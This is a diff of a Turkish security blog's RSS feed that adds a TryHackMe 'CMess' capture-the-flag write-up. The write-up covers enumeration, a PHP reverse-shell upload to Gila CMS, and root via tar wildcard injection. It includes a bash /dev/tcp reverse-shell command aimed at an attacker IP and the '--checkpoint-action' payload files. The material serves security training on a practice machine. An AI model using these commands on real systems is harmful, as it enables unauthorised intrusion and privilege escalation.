@@ -5,8 +5,208 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Sat, 12 Sep 2020 20:53:26 +0300</lastBuildDate>
+        <lastBuildDate>Tue, 15 Sep 2020 20:03:12 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM CMess Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/09/thm-cmess-write-up/</link>
+            <pubDate>Tue, 15 Sep 2020 20:03:12 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/09/thm-cmess-write-up/</guid>
+            <description>Merhaba, bu yazımda TryHackMe platformunda yer alan, orta seviye zorlukta olan CMess adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...  1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
+sudo nmap -sV -sC 10.10.190.58   cmess.thm  alan adı  /etc/hosts  dosyasına dns çözümlemesi için eklenmesi, makina tasarımcı tarafından istenmektedir.  sudo nano /etc/hosts -------------------- ##Ekleme 10.</description>
+            <content type="html"><![CDATA[
+
+<div style="text-align:justify;">
+Merhaba, bu yazımda TryHackMe platformunda yer alan, orta seviye zorlukta olan CMess adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...
+</div>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.190.58 
+</code></pre></div>
+    <img src="/images/thm/cmess/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+<br>
+<i style="color:yellow"><b> cmess.thm </b></i> alan adı <i style="color:yellow"><b> /etc/hosts </b></i> dosyasına dns çözümlemesi için eklenmesi, makina tasarımcı tarafından istenmektedir. 
+</div>
+<pre><code class="language-terminal" data-lang="terminal">    sudo nano /etc/hosts
+    --------------------
+    ##Ekleme
+    10.10.173.46    cmess.thm
+</code></pre><p>
+
+<div style="text-align:justify;">
+Tarayıcı ile web servisine istek atılır. İçerik yönetim yazılımlarından olan Gila CMS web sayfası açılmaktadır.
+</div>
+
+    <img src="/images/thm/cmess/website.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+</p>
+<p>Web dizininde yer alan dosyalar ve klasörlerin tespiti için gobuster kullanılır.</p>
+<pre><code class="language-terminal" data-lang="terminal">gobuster dir -u http://10.10.190.58 -w /usr/share/wordlists/dirb/common.txt 
+</code></pre><pre><code>===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.190.58
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/05 09:53:31 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/0 (Status: 200)
+/01 (Status: 200)
+/1 (Status: 200)
+/1x1 (Status: 200)
+/about (Status: 200)
+/About (Status: 200)
+/admin (Status: 200)
+/api (Status: 200)
+/assets (Status: 301)
+/author (Status: 200)
+/blog (Status: 200)
+/category (Status: 200)
+/feed (Status: 200)
+/fm (Status: 200)
+/Index (Status: 200)
+/index (Status: 200)
+/lib (Status: 301)
+/log (Status: 301)
+/login (Status: 200)
+/robots.txt (Status: 200)
+/search (Status: 200)
+/Search (Status: 200)
+/server-status (Status: 403)
+/sites (Status: 301)
+/src (Status: 301)
+/tag (Status: 200)
+/tags (Status: 200)
+/themes (Status: 301)
+/tmp (Status: 301)
+===============================================================
+2020/09/05 09:54:20 Finished
+===============================================================
+
+</code></pre>
+
+<div style="text-align:justify;">
+Nmap ve gobuster taramalarında robots.txt dosyası içerisinde <i style="color:yellow"> /src, /themes, /lib </i> dizin girdileri yer almaktadır. Ayrıca /login dizinine girildiğinde giriş paneli görülmektedir.
+</div>
+<p>
+    <img src="/images/thm/cmess/login.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+Web dizininde yapılan alt dizin taramalarında herhangi bir kullanıcı adı ve parola bilgileri tespit edilememiştir. Wfuzz aracı ile subdomain taraması yapılarak alt alan adları tespit edilmeye çalışılır.Wordlist olarak SecLists listeler topluluğu içerisinde yeralan en çok kullanılan dns listesi kullanılır.
+</div></p>
+<p><strong>SecList Kurulumu</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">##Zip Olarak Kurulumu</span>
+wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  <span style="color:#f92672">&amp;&amp;</span> unzip SecList.zip <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>  <span style="color:#f92672">&amp;&amp;</span> rm -f SecList.zip
+
+<span style="color:#75715e">##Git İle Kurulumu</span>
+git clone https://github.com/danielmiessler/SecLists.git
+</code></pre></div><pre><code>wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://cmess.thm&quot;  -H &quot;Host: FUZZ.cmess.thm&quot; --hw 290
+</code></pre><p>
+    <img src="/images/thm/cmess/wfuzz.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+
+
+Tespit edilen subdomain önce <i style="color:yellow"> /etc/hosts </i> dosyasına subdomain.cmess.thm şekilde olacak şekilde eklenir ve adrese gidilir. İçerisinde bir kullanıcının destek ekibi ile yaptığı kullanıcı parola sıfırlama işlemine ait yazışmalar yer almaktadır. 
+</div></p>
+<p>
+    <img src="/images/thm/cmess/passrecovery.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">
+Kullanıcıya ait giriş bilgileri ile login panelinden giriş yapılır. CMS yönetim paneli açılmaktadır.
+</div></p>
+
+    <img src="/images/thm/cmess/webadmin.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Web panelinden shell almak için soldaki  <strong>Content -&gt; File Manager -&gt; File Upload</strong>  sekmesi takip edilerek <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> kodlarının yer aldığı php sayfası upload edilir. Upload edilen dosya <strong>src/assets</strong> klasörü altında yer almaktadır.</p>
+
+    <img src="/images/thm/cmess/upload.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<pre><code class="language-terminal" data-lang="terminal">nc -lvp 4444
+</code></pre>
+
+<div style="text-align:justify;">
+Upload ettiğimiz reverse shell dosyasında ayarlanan port dinlenmeye başlanır. Tarayıcı üzerinde reverse.php dosyası çağırılır ve shell bağlantısı gerçekleştirilir.
+<br><br>
+</div>
+
+    <img src="/images/thm/cmess/nc.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><strong>www-data</strong> kullanıcısı ile sisteme erişim sağladığından yetki yükseltmek için <a href="https://github.com/rebootuser/LinEnum">LinEnum betiği</a> çalıştırlarak bilgi toplanır. Elde edilen bilgilerde <strong><em>/opt</em></strong> dizini altında gizli bir password yedek dosyası görülmektedir. İçeriğine bakıldığında <em>andres</em> kullanısına ait oturum parolası elde edilir.</p>
+
+    <img src="/images/thm/cmess/userpass.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> su andres 
+</code></pre></div><p>komutu ile andres kullanıcısı ile oturum açılır. Daha sonra /home/andres dizininde yer alan user.txt dosyası okunur.</p>
+
+    <img src="/images/thm/cmess/userflag.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Yetki yükseltme aşamasında zamanlanmış görevler, suid ve sgid biti aktif dosyalar, alınmış yedekler ve zayıf dosya yetkileri vb. kontrol edilir. Testlerde yaygın olarak sistem hakkında bilgiler <a href="https://github.com/rebootuser/LinEnum">LinEnum betiği</a> kullanılarak elde edilir. Crontab içeriğinde tar uygulaması ile zamanlamış yedekleme işlemi dikkat çekmektedir. Backup klasöründeki herşey /tmp klasörü altına yedeklenmektedir.</p>
+
+    <img src="/images/thm/cmess/crontab.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Tar uygulamasında wilcard injection metodu ile yetki yükseltilebilmektedir. Linux sistemlerde joker karakter (wildcard) olarak kullanılan çeşitli karakterler vardır. Bunlardan bazıları <code>{* , ?, [], -, ~ }</code> .
+Bunlar işlem yapılmadan önce kabuk tarafından yorumlanır. Tar ile uygulamasına bakacak olursak,yedeklenecek klasör içerisinde 3 adet dosya oluşturulur.</p>
+<ol>
+<li>Çalıştırılacak kabuk dosyası</li>
+<li>Tar uygulamasının parametre olarak alacağı 2 adet dosya</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.8.97.33/6666 &lt;&amp;1&#39;&#34;</span> &gt; shell.sh
+echo <span style="color:#e6db74">&#34;&#34;</span> &gt; <span style="color:#e6db74">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
+echo <span style="color:#e6db74">&#34;&#34;</span> &gt; --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</code></pre></div><p>Backup klasör içeriğine bakıldığında oluşturulan dosyalar görülmektedir.</p>
+
+    <img src="/images/thm/cmess/tarwilcard.png"  alt="Barcode"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Tar uygulaması çalıştığında - - ile başlayan dosyaları parametre olarak alacak ve shell.sh dosyasını çalıştıracaktır. Shell dosyasında ayarlanan port dinlemeye alınır ve yedekleme çalıştığında root yetkisi ile oturum elde edilir.</p>
+<pre><code class="language-terminal" data-lang="terminal">─[barcode@parrot]─[~]$ nc -lvp 6666
+listening on [any] 6666 ...
+connect to [10.8.97.33] from cmess.thm [10.10.173.46] 46366
+bash: cannot set terminal process group (990): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cmess:/home/andre/backup# cd
+root@cmess:~# ls
+root.txt
+root@cmess:~# cat root.txt
+**************************
+root@cmess:~# 
+</code></pre>]]></content>
+        </item>
         
         <item>
             <title>THM Tartarus Write Up</title>
@@ -14,20 +214,16 @@
             <pubDate>Sat, 12 Sep 2020 20:53:26 +0300</pubDate>
             
             <guid>https://barcode91.github.io/posts/2020/09/thm-tartarus-write-up/</guid>
-            <description>Merhaba, Siber güvenliğe yeni başlayanların ofansif yeteneklerini geliştirebileceği TryHackMe platformunda yer alan, başlangıç seviyesi olan Tartarus adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...  1. Keşif Aşaması Nmap ile makinenin açık portlar ve portlarda çalışan servisler tespit edilir.
+            <description>Merhaba, Siber güvenliğe yeni başlayanların ofansif yeteneklerini geliştirebileceği TryHackMe platformunda yer alan, başlangıç seviyesi olan Tartarus adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...  1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
 sudo nmap -sV -sC 10.10.236.165  Tarayıcı ile web servisine istek atılır. Apache yazılımına ait varsayılan web sayfası açılmaktadır.
 Web dizininde yer alan dosyalar ve klasörlerin tespiti için gobuster kullanılır.</description>
             <content type="html"><![CDATA[
-    <img src="/images/thm/tartarus/Screenshot_2020-08-28_13-45-54.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
-
-
-
 
 <div style="text-align:justify;">
 Merhaba, Siber güvenliğe yeni başlayanların ofansif yeteneklerini geliştirebileceği TryHackMe platformunda yer alan, başlangıç seviyesi olan Tartarus adlı makinanın çözümünden bahsedeğim. Hatalı yada ilave açıklama gerektiren yerler için yorum bırakabilirsiniz. Keyifli okumalar...
 </div>
 <h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
-<p>Nmap ile makinenin açık portlar ve portlarda çalışan servisler tespit edilir.</p>
+<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.236.165 
 </code></pre></div>
     <img src="/images/thm/tartarus/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
